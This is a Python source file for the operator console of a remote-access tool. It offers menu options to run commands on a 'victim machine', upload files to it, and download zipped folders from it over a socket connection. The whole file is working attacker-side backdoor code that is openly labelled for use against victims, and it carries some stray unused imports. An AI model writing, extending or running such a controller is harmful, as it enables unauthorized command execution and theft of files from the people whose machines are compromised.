
import os

from fileinput import filename
from yaml import compose_all


def showOptions():
    print("\n")
    print("\t\t 1. Run Command on victim machine")
    print("\t\t 2. Upload file")
    print("\t\t 3. Download Files and folder from the victim machine")
    

def handleConnection(my_socket):
    print("[+] Handling Connection")
    
    while(True):
        showOptions()
        
        user_input = input("[+] Select Option: ")
        

        
        if user_input == "1":
            my_socket.send_data(user_input)
            print("Running Commands:")
            while(True):
                print(">>>" , end = " ")
                command = input()
                if (command == "" or command == " "):
                    continue

                if command == "##stop##":
                    my_socket.send_data(user_input)
                    break

                my_socket.send_data(command)

                result = my_socket.recieve_data()
                print(result)


        elif user_input == '2':
            my_socket.send_data(user_input)
            print("Send files")
            
            file_path = input("Enter File path: ")
            fname = os.path.basename(file_path)


            my_socket.send_data(fname)
        
            
            my_socket.upload_file(file_path)

        elif user_input == "3":

            print("Download files from the victim")
            skip = input("Hi! So here's the thing, if you want to download files, Use 'Run command' option \n wander to the directory you want to recieve, copy its path paste it here, and then files will be zipped and downloaded. To jump to running commands option type 'skip' ")

            if(skip == "skip"):
                continue
            
            my_socket.send_data(user_input)
                       
            my_socket.download_file()


            

        elif (user_input == "99"):
            my_socket.send_data(user_input)
            break
        else:
            print("[-] Invalid Input")
    
        


